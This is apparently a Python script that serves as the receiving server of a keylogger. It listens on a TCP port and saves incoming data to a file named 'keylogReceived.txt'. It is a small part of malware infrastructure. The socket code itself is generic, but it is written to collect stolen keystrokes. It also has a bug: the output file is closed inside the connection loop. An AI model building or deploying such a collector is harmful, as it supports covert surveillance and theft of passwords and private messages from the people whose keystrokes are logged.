#!/usr/bin/env python3

#Import Necessary Libraries
import socket

#Configure Parameters For File Transfer (IP,Port,Transfer Size)
TCP_IP = '127.0.0.1'
TCP_PORT = 6005
BUFFER_SIZE = 1024

#Configure The Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((TCP_IP,TCP_PORT))
s.listen(10)

#Create File To Write Transferred Contents To
f = open('keylogReceived.txt','wb')

#Transfer Contents and Close Connection Once Finished Transferring
while True:
    conn, addr = s.accept()
    print('Connection Address:' , addr)
    print('Receiving')
    l = conn.recv(BUFFER_SIZE)
    while(l):
        print('Receiving')
        f.write(l)
        l = conn.recv(1024)
    f.close()
    print('Done Receiving')
    conn.close()
